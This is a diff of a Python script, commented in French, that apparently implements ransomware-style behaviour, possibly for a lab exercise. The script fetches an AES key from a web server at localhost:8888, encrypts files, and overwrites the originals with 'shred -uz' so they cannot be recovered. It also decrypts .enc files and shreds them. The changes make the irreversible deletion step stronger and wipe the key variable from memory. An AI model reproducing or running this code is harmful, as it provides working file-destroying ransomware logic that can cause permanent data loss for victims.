@@ -57,7 +57,7 @@ def decryptFile(key, filename, out_filename=None, chunksize=24*1024):
 
 def main(argv):
 
-    #faire une requête get au serveur web pour récupérer la clé AES256
+    #faire une requête get au serveur web pour récupérer la clé et l'iv
     url = 'http://localhost:8888/key.txt'
     resp = requests.get(url)
     key=resp.text
@@ -84,25 +84,25 @@ def main(argv):
                 if file[-4:] == ".enc":
                     print("[*] Decrypting... ")
                     decryptFile(key, file)
-                    os.remove(file)
+	            #utilisation de commande bash shred pour supprimer de manière sécurisé les fichiers .enc
+                    subprocess.check_output(["shred", "-uz", file])
+
             # encrypt
             else:
                 if file[-4:] != ".enc":
                     print("[*] Encrypting... ")
                     encryptFile(key, file)
-                    #os.remove(file)
-                    res = subprocess.check_output(["shred", "-uvz", file])
-                    for line in res.splitlines():
-                        # process the output line by line
+                    #utilisation de commande bash shred pour supprimer de manière sécurisé les fichiers d'origine
+                    subprocess.check_output(["shred", "-uz", file])
 
-   
+    
     '''supprime de la variable et donc la référence à la zone mémoire ou est stocké la valeur de la key, il n'y plus de référence à cette valeur.
     Python via l'algo garbage collection détruit cette zone mémoire pour la réalouer à un nouvelle objet.
     La garbage collection a deux façon de fonctionner: comptage de références et générationnel. 
     - Si le nombre de références d'un objet atteint 0, l'algorithme de comptage de références nettoit la zone mémoire de l'objet.
     - Si il y a un cycle, l'algorithme de références est inefficace, c'est l'algorithme générationnel qui nettoie la zone mémoire
     '''
-    print(lol)
+    del key
 
 if __name__ == '__main__':
     main(sys.argv)
